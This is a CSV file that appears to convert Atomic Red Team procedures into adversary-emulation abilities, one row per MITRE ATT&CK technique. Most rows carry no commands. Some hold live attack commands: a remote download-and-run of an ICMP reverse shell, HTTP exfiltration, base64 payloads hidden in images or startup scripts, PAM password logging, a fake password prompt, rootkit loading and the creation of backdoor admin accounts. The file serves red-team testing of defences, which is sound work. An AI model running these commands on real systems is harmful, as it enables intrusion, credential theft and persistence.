id,name,description,tactic,technique_attack_id,technique_full_name,windows_command,windows_executor,linux_command,linux_executor,darwin_command,darwin_executor,privilege,payloads,cleanup,target_dir,yml_filename,vars,has_hardcoded_abs_paths_hint
<GENERATE_UUIDv4>,Data Obfuscation,Ability for Data Obfuscation (ATT&CK T1001). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1001,Data Obfuscation,"Get-Content ""#{image_file}"", ""#{tar_file}"" -Encoding byte -ReadCount 0 | Set-Content ""#{new_image_file}"" -Encoding byte",psh,"cat ""#{script}"" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat ""#{image}"" - > ""#{evil_image}""; strings ""#{evil_image}"" | tail -n 1 | base64 -d | sh",sh,,,,,,stockpile/data/abilities/command-and-control/,T1001__data-obfuscation.yml,image_file;new_image_file;tar_file,no
<GENERATE_UUIDv4>,Data Compressed,Ability for Data Compressed (ATT&CK T1002). Generated from Atomic Red Team procedures; review and test safely before use.,exfiltration,T1002,Data Compressed,,,,,,,,,,stockpile/data/abilities/exfiltration/,T1002__data-compressed.yml,volume,no
<GENERATE_UUIDv4>,Winlogon Helper DLL,Ability for Winlogon Helper DLL (ATT&CK T1004). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1004,Winlogon Helper DLL,,,,,,,,,,stockpile/data/abilities/persistence/,T1004__winlogon-helper-dll.yml,,no
<GENERATE_UUIDv4>,Direct Volume Access,Ability for Direct Volume Access (ATT&CK T1006). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1006,Direct Volume Access,"$buffer = New-Object byte[] 11 $handle = New-Object IO.FileStream ""\\.\#{volume}"", 'Open', 'Read', 'ReadWrite' $handle.Read($buffer, 0, $buffer.Length) $handle.Close() Format-Hex -InputObject $buffer",psh,,,,,,,,stockpile/data/abilities/defense-evasion/,T1006__direct-volume-access.yml,,no
<GENERATE_UUIDv4>,Fallback Channels,Ability for Fallback Channels (ATT&CK T1008). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1008,Fallback Channels,,,,,,,,,,stockpile/data/abilities/command-and-control/,T1008__fallback-channels.yml,domain;file,no
<GENERATE_UUIDv4>,Binary Padding,Ability for Binary Padding (ATT&CK T1009). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1009,Binary Padding,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1009__binary-padding.yml,,no
<GENERATE_UUIDv4>,Exfiltration Over Other Network Medium,Ability for Exfiltration Over Other Network Medium (ATT&CK T1011). Generated from Atomic Red Team procedures; review and test safely before use.,exfiltration,T1011,Exfiltration Over Other Network Medium,,,,,,,,,,stockpile/data/abilities/exfiltration/,T1011__exfiltration-over-other-network-medium.yml,input_file;output_file,yes
<GENERATE_UUIDv4>,Port Monitors,Ability for Port Monitors (ATT&CK T1013). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1013,Port Monitors,,,,,,,,,,stockpile/data/abilities/persistence/,T1013__port-monitors.yml,,no
<GENERATE_UUIDv4>,Rootkit,Ability for Rootkit (ATT&CK T1014). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1014,Rootkit,,,sudo insmod #{rootkit_path}/#{rootkit_name}.ko,sh,,,,,,stockpile/data/abilities/defense-evasion/,T1014__rootkit.yml,script_command;script_path,yes
<GENERATE_UUIDv4>,Accessibility Features,Ability for Accessibility Features (ATT&CK T1015). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1015,Accessibility Features,,,,,,,,,,stockpile/data/abilities/persistence/,T1015__accessibility-features.yml,local_file;remote;share_file,no
<GENERATE_UUIDv4>,Application Deployment Software,Ability for Application Deployment Software (ATT&CK T1017). Generated from Atomic Red Team procedures; review and test safely before use.,lateral-movement,T1017,Application Deployment Software,,,,,,,,,,stockpile/data/abilities/lateral-movement/,T1017__application-deployment-software.yml,,no
<GENERATE_UUIDv4>,System Firmware,Ability for System Firmware (ATT&CK T1019). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1019,System Firmware,,,,,,,,,,stockpile/data/abilities/persistence/,T1019__system-firmware.yml,,no
<GENERATE_UUIDv4>,Automated Exfiltration,Ability for Automated Exfiltration (ATT&CK T1020). Generated from Atomic Red Team procedures; review and test safely before use.,exfiltration,T1020,Automated Exfiltration,"$fileName = ""#{file}"" $url = ""#{domain}"" $file = New-Item -Force $fileName -Value ""This is ART IcedID Botnet Exfil Test"" $contentType = ""application/octet-stream"" try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}",psh,,,,,,,,stockpile/data/abilities/exfiltration/,T1020__automated-exfiltration.yml,file_name;server_name,yes
<GENERATE_UUIDv4>,Data Encrypted,Ability for Data Encrypted (ATT&CK T1022). Generated from Atomic Red Team procedures; review and test safely before use.,exfiltration,T1022,Data Encrypted,,,,,,,,,,stockpile/data/abilities/exfiltration/,T1022__data-encrypted.yml,,no
<GENERATE_UUIDv4>,Shortcut Modification,Ability for Shortcut Modification (ATT&CK T1023). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1023,Shortcut Modification,,,,,,,,,,stockpile/data/abilities/persistence/,T1023__shortcut-modification.yml,,no
<GENERATE_UUIDv4>,Custom Cryptographic Protocol,Ability for Custom Cryptographic Protocol (ATT&CK T1024). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1024,Custom Cryptographic Protocol,,,,,,,,,,stockpile/data/abilities/command-and-control/,T1024__custom-cryptographic-protocol.yml,radmin_exe,no
<GENERATE_UUIDv4>,Data from Removable Media,Ability for Data from Removable Media (ATT&CK T1025). Generated from Atomic Red Team procedures; review and test safely before use.,collection,T1025,Data from Removable Media,"powershell.exe -c ""Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | ForEach-Object { Get-ChildItem -Path ($_.DriveLetter + ':\*') -Recurse -Include '*.doc*','*.xls*','*.txt','*.pdf' -ErrorAction SilentlyContinue | ForEach-Object {Write-Output $_.FullName} } ; if (-not (Get-Volume | Where-Object {$_.DriveType -eq 'Removable'})) { Write-Output 'No removable media.' }""",psh,,,,,,,,stockpile/data/abilities/collection/,T1025__data-from-removable-media.yml,,no
<GENERATE_UUIDv4>,Multiband Communication,Ability for Multiband Communication (ATT&CK T1026). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1026,Multiband Communication,,,,,,,,,,stockpile/data/abilities/command-and-control/,T1026__multiband-communication.yml,password,yes
<GENERATE_UUIDv4>,Obfuscated Files or Information,Ability for Obfuscated Files or Information (ATT&CK T1027). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1027,Obfuscated Files or Information,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:#{output_file} ""#{input_file}""",psh,gcc #{input_file} && ./a.out clang #{input_file} && ./a.out,sh,gcc #{input_file} && ./a.out clang #{input_file} && ./a.out,sh,,,,stockpile/data/abilities/defense-evasion/,T1027__obfuscated-files-or-information.yml,,no
<GENERATE_UUIDv4>,Windows Remote Management,Ability for Windows Remote Management (ATT&CK T1028). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1028,Windows Remote Management,,,,,,,,,,stockpile/data/abilities/execution/,T1028__windows-remote-management.yml,,no
<GENERATE_UUIDv4>,Modify Existing Service,Ability for Modify Existing Service (ATT&CK T1031). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1031,Modify Existing Service,,,,,,,,,,stockpile/data/abilities/persistence/,T1031__modify-existing-service.yml,atomics_dir,no
<GENERATE_UUIDv4>,Standard Cryptographic Protocol,Ability for Standard Cryptographic Protocol (ATT&CK T1032). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1032,Standard Cryptographic Protocol,,,,,,,,,,stockpile/data/abilities/command-and-control/,T1032__standard-cryptographic-protocol.yml,,no
<GENERATE_UUIDv4>,Path Interception,Ability for Path Interception (ATT&CK T1034). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1034,Path Interception,,,,,,,,,,stockpile/data/abilities/persistence/,T1034__path-interception.yml,server_ip,no
<GENERATE_UUIDv4>,Service Execution,Ability for Service Execution (ATT&CK T1035). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1035,Service Execution,,,,,,,,,,stockpile/data/abilities/execution/,T1035__service-execution.yml,,no
<GENERATE_UUIDv4>,Masquerading,Ability for Masquerading (ATT&CK T1036). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1036,Masquerading,"copy-item ""$env:windir\System32\cmd.exe"" -destination ""$env:allusersprofile\cmd.exe"" start-process ""$env:allusersprofile\cmd.exe"" sleep -s 5 stop-process -name ""cmd"" | out-null",psh,"mkdir $HOME/... cp $(which sh) $HOME/... $HOME/.../sh -c ""echo #{test_message}""",sh,"mkdir $HOME/... cp $(which sh) $HOME/... $HOME/.../sh -c ""echo #{test_message}""",sh,,,,stockpile/data/abilities/defense-evasion/,T1036__masquerading.yml,,no
<GENERATE_UUIDv4>,Boot or Logon Initialization Scripts,Ability for Boot or Logon Initialization Scripts (ATT&CK T1037). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1037,Boot or Logon Initialization Scripts,"echo ""#{script_command}"" > #{script_path} REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d ""#{script_path}"" /f",psh,"filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\"""" | sudo tee -a /etc/rc.common printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common sudo chmod +x /etc/rc.common",sh,sudo touch /Library/StartupItems/EvilStartup.plist,sh,,,,stockpile/data/abilities/persistence/,T1037__boot-or-logon-initialization-scripts.yml,output_file;source_file,yes
<GENERATE_UUIDv4>,DLL Search Order Hijacking,Ability for DLL Search Order Hijacking (ATT&CK T1038). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1038,DLL Search Order Hijacking,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1038__dll-search-order-hijacking.yml,user,yes
<GENERATE_UUIDv4>,Data from Network Shared Drive,Ability for Data from Network Shared Drive (ATT&CK T1039). Generated from Atomic Red Team procedures; review and test safely before use.,collection,T1039,Data from Network Shared Drive,copy \\#{remote}\C$\#{share_file} %TEMP%\#{local_file},psh,,,,,,,,stockpile/data/abilities/collection/,T1039__data-from-network-shared-drive.yml,file_path;output_file,yes
<GENERATE_UUIDv4>,Change Default File Association,Ability for Change Default File Association (ATT&CK T1042). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1042,Change Default File Association,,,,,,,,,,stockpile/data/abilities/persistence/,T1042__change-default-file-association.yml,,no
<GENERATE_UUIDv4>,Commonly Used Port,Ability for Commonly Used Port (ATT&CK T1043). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1043,Commonly Used Port,,,,,,,,,,stockpile/data/abilities/command-and-control/,T1043__commonly-used-port.yml,,no
<GENERATE_UUIDv4>,File System Permissions Weakness,Ability for File System Permissions Weakness (ATT&CK T1044). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1044,File System Permissions Weakness,,,,,,,,,,stockpile/data/abilities/persistence/,T1044__file-system-permissions-weakness.yml,filename;jscname;jscpath,yes
<GENERATE_UUIDv4>,Software Packing,Ability for Software Packing (ATT&CK T1045). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1045,Software Packing,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1045__software-packing.yml,plink_file;pscp_file;vib_file;vib_install;vm_host;vm_pass;vm_user,no
<GENERATE_UUIDv4>,New Service,Ability for New Service (ATT&CK T1050). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1050,New Service,,,,,,,,,,stockpile/data/abilities/persistence/,T1050__new-service.yml,destination_url;extension_id;key;plaintext,yes
<GENERATE_UUIDv4>,Shared Webroot,Ability for Shared Webroot (ATT&CK T1051). Generated from Atomic Red Team procedures; review and test safely before use.,lateral-movement,T1051,Shared Webroot,,,,,,,,,,stockpile/data/abilities/lateral-movement/,T1051__shared-webroot.yml,group;mimikatz_path;outlook_folder;outlook_version;password;sam_account_name;sid_to_inject;url;username,yes
<GENERATE_UUIDv4>,Exfiltration Over Physical Medium,Ability for Exfiltration Over Physical Medium (ATT&CK T1052). Generated from Atomic Red Team procedures; review and test safely before use.,exfiltration,T1052,Exfiltration Over Physical Medium,,,,,,,,,,stockpile/data/abilities/exfiltration/,T1052__exfiltration-over-physical-medium.yml,executable,no
<GENERATE_UUIDv4>,Indicator Blocking,Ability for Indicator Blocking (ATT&CK T1054). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1054,Indicator Blocking,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1054__indicator-blocking.yml,,no
<GENERATE_UUIDv4>,Input Capture,Ability for Input Capture (ATT&CK T1056). Generated from Atomic Red Team procedures; review and test safely before use.,collection,T1056,Input Capture,"mavinject $pid /INJECTRUNNING ""#{file_name}"" Invoke-WebRequest #{server_name} -UseBasicParsing",psh,"if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk sudo touch /tmp/system-auth.bk sudo echo ""session required pam_tty_audit.so enable=* log_password"" >> /etc/pam.d/password-auth sudo echo ""session required pam_tty_audit.so enable=* log_password"" >> /etc/pam.d/system-auth",sh,"osascript -e 'tell app ""System Preferences"" to activate' -e 'tell app ""System Preferences"" to activate' -e 'tell app ""System Preferences"" to display dialog ""Software Update requires that you type your password to apply changes."" & return & return default answer """" with icon 1 with hidden answer with title ""Software Update""'",sh,,,,stockpile/data/abilities/collection/,T1056__input-capture.yml,,no
<GENERATE_UUIDv4>,Service Registry Permissions Weakness,Ability for Service Registry Permissions Weakness (ATT&CK T1058). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1058,Service Registry Permissions Weakness,,,,,,,,,,stockpile/data/abilities/persistence/,T1058__service-registry-permissions-weakness.yml,,no
<GENERATE_UUIDv4>,Registry Run Keys / Startup Folder,Ability for Registry Run Keys / Startup Folder (ATT&CK T1060). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1060,Registry Run Keys / Startup Folder,,,,,,,,,,stockpile/data/abilities/persistence/,T1060__registry-run-keys-startup-folder.yml,,no
<GENERATE_UUIDv4>,Graphical User Interface,Ability for Graphical User Interface (ATT&CK T1061). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1061,Graphical User Interface,,,,,,,,,,stockpile/data/abilities/execution/,T1061__graphical-user-interface.yml,,no
<GENERATE_UUIDv4>,Hypervisor,Ability for Hypervisor (ATT&CK T1062). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1062,Hypervisor,,,,,,,,,,stockpile/data/abilities/persistence/,T1062__hypervisor.yml,,no
<GENERATE_UUIDv4>,Security Software Discovery,Ability for Security Software Discovery (ATT&CK T1063). Generated from Atomic Red Team procedures; review and test safely before use.,discovery,T1063,Security Software Discovery,,,,,,,,,,stockpile/data/abilities/discovery/,T1063__security-software-discovery.yml,,no
<GENERATE_UUIDv4>,Scripting,Ability for Scripting (ATT&CK T1064). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1064,Scripting,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1064__scripting.yml,,no
<GENERATE_UUIDv4>,Uncommonly Used Port,Ability for Uncommonly Used Port (ATT&CK T1065). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1065,Uncommonly Used Port,,,,,,,,,,stockpile/data/abilities/command-and-control/,T1065__uncommonly-used-port.yml,,no
<GENERATE_UUIDv4>,Indicator Removal from Tools,Ability for Indicator Removal from Tools (ATT&CK T1066). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1066,Indicator Removal from Tools,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1066__indicator-removal-from-tools.yml,,no
<GENERATE_UUIDv4>,Bootkit,Ability for Bootkit (ATT&CK T1067). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1067,Bootkit,,,,,,,,,,stockpile/data/abilities/persistence/,T1067__bootkit.yml,,no
<GENERATE_UUIDv4>,Exploitation for Privilege Escalation,Ability for Exploitation for Privilege Escalation (ATT&CK T1068). Generated from Atomic Red Team procedures; review and test safely before use.,privilege-escalation,T1068,Exploitation for Privilege Escalation,,,,,,,,,,stockpile/data/abilities/privilege-escalation/,T1068__exploitation-for-privilege-escalation.yml,working_dir,no
<GENERATE_UUIDv4>,Software Deployment Tools,Ability for Software Deployment Tools (ATT&CK T1072). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1072,Software Deployment Tools,"""%PROGRAMFILES(x86)%/#{radmin_exe}""",psh,,,,,,,,stockpile/data/abilities/execution/,T1072__software-deployment-tools.yml,,no
<GENERATE_UUIDv4>,DLL Side-Loading,Ability for DLL Side-Loading (ATT&CK T1073). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1073,DLL Side-Loading,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1073__dll-side-loading.yml,,no
<GENERATE_UUIDv4>,Pass the Hash,Ability for Pass the Hash (ATT&CK T1075). Generated from Atomic Red Team procedures; review and test safely before use.,lateral-movement,T1075,Pass the Hash,,,,,,,,,,stockpile/data/abilities/lateral-movement/,T1075__pass-the-hash.yml,,no
<GENERATE_UUIDv4>,Remote Desktop Protocol,Ability for Remote Desktop Protocol (ATT&CK T1076). Generated from Atomic Red Team procedures; review and test safely before use.,lateral-movement,T1076,Remote Desktop Protocol,,,,,,,,,,stockpile/data/abilities/lateral-movement/,T1076__remote-desktop-protocol.yml,captureServerIP;efsApi;petitpotam_path;targetServerIP,no
<GENERATE_UUIDv4>,Windows Admin Shares,Ability for Windows Admin Shares (ATT&CK T1077). Generated from Atomic Red Team procedures; review and test safely before use.,lateral-movement,T1077,Windows Admin Shares,,,,,,,,,,stockpile/data/abilities/lateral-movement/,T1077__windows-admin-shares.yml,,no
<GENERATE_UUIDv4>,Valid Accounts,Ability for Valid Accounts (ATT&CK T1078). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1078,Valid Accounts,net user art-test /add net user art-test #{password} net localgroup administrators art-test /add,psh,"password=$(openssl passwd -1 art) ([ ""$(uname)"" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0)) su art -c ""whoami; exit""",sh,"dscl . -create /Users/AtomicUser dscl . -create /Users/AtomicUser UserShell /bin/bash dscl . -create /Users/AtomicUser RealName ""Atomic User"" dscl . -create /Users/AtomicUser UniqueID 503 dscl . -create /Users/AtomicUser PrimaryGroupID 503 dscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser dscl . -passwd /Users/AtomicUser mySecretPassword dscl . -append /Groups/admin GroupMembership AtomicUser",sh,,,,stockpile/data/abilities/defense-evasion/,T1078__valid-accounts.yml,,no
<GENERATE_UUIDv4>,Multilayer Encryption,Ability for Multilayer Encryption (ATT&CK T1079). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1079,Multilayer Encryption,,,,,,,,,,stockpile/data/abilities/command-and-control/,T1079__multilayer-encryption.yml,,yes
<GENERATE_UUIDv4>,Taint Shared Content,Ability for Taint Shared Content (ATT&CK T1080). Generated from Atomic Red Team procedures; review and test safely before use.,lateral-movement,T1080,Taint Shared Content,,,,,,,,,,stockpile/data/abilities/lateral-movement/,T1080__taint-shared-content.yml,payload_path;process,no
<GENERATE_UUIDv4>,Credentials in Files,Ability for Credentials in Files (ATT&CK T1081). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1081,Credentials in Files,,,,,,,,,,stockpile/data/abilities/credential-access/,T1081__credentials-in-files.yml,,no
<GENERATE_UUIDv4>,Windows Management Instrumentation Event Subscription,Ability for Windows Management Instrumentation Event Subscription (ATT&CK T1084). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1084,Windows Management Instrumentation Event Subscription,,,,,,,,,,stockpile/data/abilities/persistence/,T1084__windows-management-instrumentation-event-subscription.yml,atomics_dir;attribute;mimikatz_path;object;psexec_path;value,yes
<GENERATE_UUIDv4>,Rundll32,Ability for Rundll32 (ATT&CK T1085). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1085,Rundll32,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1085__rundll32.yml,,no
<GENERATE_UUIDv4>,PowerShell,Ability for PowerShell (ATT&CK T1086). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1086,PowerShell,,,,,,,,,,stockpile/data/abilities/execution/,T1086__powershell.yml,,no
<GENERATE_UUIDv4>,Bypass User Account Control,Ability for Bypass User Account Control (ATT&CK T1088). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1088,Bypass User Account Control,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1088__bypass-user-account-control.yml,file_url;remote_payload,yes
<GENERATE_UUIDv4>,Disabling Security Tools,Ability for Disabling Security Tools (ATT&CK T1089). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1089,Disabling Security Tools,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1089__disabling-security-tools.yml,docx_file;msxsl_exe;xmlfile;xslfile,yes
<GENERATE_UUIDv4>,Proxy,Ability for Proxy (ATT&CK T1090). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1090,Proxy,"& ""#{atomics_dir}\T1090.003\src\Psiphon.bat""",psh,"[ ""$(uname)"" = 'FreeBSD' ] && sysrc tor_enable=""YES"" && service tor start || sudo systemctl start tor",sh,"osascript -e 'tell application ""Terminal"" to do script ""tor""'",sh,,,,stockpile/data/abilities/command-and-control/,T1090__proxy.yml,,no
<GENERATE_UUIDv4>,Replication Through Removable Media,Ability for Replication Through Removable Media (ATT&CK T1091). Generated from Atomic Red Team procedures; review and test safely before use.,initial-access,T1091,Replication Through Removable Media,"$RemovableDrives=@() $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter ""drivetype=2"" | select-object -expandproperty DeviceID ForEach ($Drive in $RemovableDrives) { write-host ""Removable Drive Found:"" $Drive New-Item -Path $Drive/T1091Test1.txt -ItemType ""file"" -Force -Value ""T1091 Test 1 has created this file to simulate malware spread to removable drives."" }",psh,,,,,,,,stockpile/data/abilities/initial-access/,T1091__replication-through-removable-media.yml,,yes
<GENERATE_UUIDv4>,Communication Through Removable Media,Ability for Communication Through Removable Media (ATT&CK T1092). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1092,Communication Through Removable Media,,,,,,,,,,stockpile/data/abilities/command-and-control/,T1092__communication-through-removable-media.yml,,no
<GENERATE_UUIDv4>,Process Hollowing,Ability for Process Hollowing (ATT&CK T1093). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1093,Process Hollowing,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1093__process-hollowing.yml,,no
<GENERATE_UUIDv4>,Custom Command and Control Protocol,Ability for Custom Command and Control Protocol (ATT&CK T1094). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1094,Custom Command and Control Protocol,,,,,,,,,,stockpile/data/abilities/command-and-control/,T1094__custom-command-and-control-protocol.yml,,no
<GENERATE_UUIDv4>,Non-Application Layer Protocol,Ability for Non-Application Layer Protocol (ATT&CK T1095). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1095,Non-Application Layer Protocol,IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1') Invoke-PowerShellIcmp -IPAddress #{server_ip},psh,,,,,,,,stockpile/data/abilities/command-and-control/,T1095__non-application-layer-protocol.yml,,yes
<GENERATE_UUIDv4>,NTFS File Attributes,Ability for NTFS File Attributes (ATT&CK T1096). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1096,NTFS File Attributes,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1096__ntfs-file-attributes.yml,,no
<GENERATE_UUIDv4>,Pass the Ticket,Ability for Pass the Ticket (ATT&CK T1097). Generated from Atomic Red Team procedures; review and test safely before use.,lateral-movement,T1097,Pass the Ticket,,,,,,,,,,stockpile/data/abilities/lateral-movement/,T1097__pass-the-ticket.yml,,no
